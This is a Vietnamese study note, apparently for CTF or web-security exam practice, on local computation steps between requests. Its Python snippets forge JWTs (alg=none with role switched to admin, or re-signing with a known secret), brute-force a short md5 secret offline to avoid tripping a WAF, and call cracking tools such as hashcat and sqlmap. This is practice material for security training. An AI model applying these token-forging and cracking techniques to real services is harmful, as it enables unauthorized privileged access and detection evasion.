# Tính toán cục bộ giữa các request (không phải lúc nào cũng là request)

Nhiều bài có 1 bước **không gửi gì ra ngoài cả** — chỉ xử lý dữ liệu đã có trong Python (decode, tính hash, sửa token, brute-force cục bộ) — rồi mới dùng kết quả đó cho request tiếp theo. Nếu bê nguyên cách nghĩ "mỗi bước = 1 request" thì sẽ bị kẹt ở bài dạng này.

## 1. Decode/sửa JWT rồi gửi lại (alg=none hoặc secret yếu)

```python
import base64
import json

def b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)           # bù padding '=' cho đủ bội số 4
    return base64.urlsafe_b64decode(s)

def b64url_encode(obj: dict) -> str:
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

token = "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.xxxxx"
header_b64, payload_b64, _sig = token.split(".")

payload = json.loads(b64url_decode(payload_b64))
print(payload)                          # xem đúng tên claim thật, đừng đoán key

# Case A: server không kiểm alg -> chuyển sang "none", bỏ signature
payload["role"] = "admin"
forged = f'{b64url_encode({"alg": "none", "typ": "JWT"})}.{b64url_encode(payload)}.'

# Case B: biết secret (đề cho/leak/bruteforce) -> ký lại đúng chuẩn bằng PyJWT
# pip install pyjwt
import jwt
forged2 = jwt.encode(payload, "secret_biet_duoc", algorithm="HS256")
```

- Không có thư viện nào "bắt buộc" cho việc này — decode JWT chỉ là base64 + JSON, dùng `base64`/`json` có sẵn trong Python là đủ cho case A.
- Case B (biết secret, ký lại cho đúng) cần cài `pyjwt` (`pip install pyjwt`) — cài trước ngày thi.
- Sau khi có `forged`/`forged2`, dán vào cookie/header rồi mới gửi request (xem [`01_Request_Co_Ban/03_Headers_Cookies_Session.md`](../01_Request_Co_Ban/03_Headers_Cookies_Session.md)).

## 2. Brute-force 1 giá trị cục bộ trước khi gửi (không tốn request nào)

Ví dụ: biết checksum = `md5(username + secret_ngan)`, secret chỉ 4 chữ số — thử hết cục bộ rồi mới gửi 1 request với checksum đúng, thay vì gửi 10000 request lên server.

```python
import hashlib
import itertools

username = "admin"
target_checksum = "a3f5c1..."          # checksum copy từ response/cookie của Burp

found = None
for digits in itertools.product("0123456789", repeat=4):
    secret = "".join(digits)
    h = hashlib.md5((username + secret).encode()).hexdigest()
    if h == target_checksum:
        found = secret
        break

print("secret:", found)   # dùng found để build request tiếp theo, 1 request duy nhất
```

- `hashlib` (md5/sha1/sha256...) và `itertools.product` (sinh mọi tổ hợp) đều có sẵn, không cần cài.
- Luôn brute-force **cục bộ** (không qua mạng) khi có thể — nhanh hơn hẳn và không làm WAF/service đối phương để ý.

## 3. Gọi tool ngoài qua `subprocess` rồi dùng kết quả

Khi bài cần 1 bước mà Python thuần làm chậm/khó hơn 1 tool chuyên dụng đã có sẵn trên máy (ví dụ `john`, `hashcat`, `sqlmap`, hoặc 1 script giải mã riêng của bạn):

```python
import subprocess

result = subprocess.run(
    ["python3", "crack_local.py", "--hash", "a3f5c1..."],
    capture_output=True, text=True, timeout=30,
)
cracked_value = result.stdout.strip()
print(cracked_value)   # dùng giá trị này cho request tiếp theo
```

- `capture_output=True, text=True` để lấy lại output dạng chuỗi thay vì chỉ chạy rồi bỏ qua.
- Luôn có `timeout=` — tool ngoài treo thì script Python cũng sẽ treo theo nếu không giới hạn.
- Chỉ nên dùng cách này khi **đã kiểm tra tool đó chạy được trên máy thi** trước giờ thi (không có Internet để cài giữa lúc thi).

## Lưu ý nhanh
- Nhận diện bước "không phải request": lúc giải tay, nếu bạn mở máy tính/CyberChef/terminal để decode-encode-tính gì đó **ngoài** Burp rồi mới dán kết quả vào request tiếp — đó chính là 1 bước tính toán cục bộ, viết thành code Python thuần (không gọi `session.get/post`) ở đúng vị trí đó trong `solve_one()`.
- Luôn `print()` giá trị vừa tính ra (token mới, hash, secret tìm được) trước khi dùng cho request tiếp theo, để biết lỗi nằm ở bước tính toán hay ở request.
- Xem thêm các cheatsheet lỗ hổng cụ thể cần tính toán cục bộ: `cheatsheets/web/lecture/crypto_hash_length_ext.html`, `crypto_padding_oracle.html`, `jwt_attacks.html`.
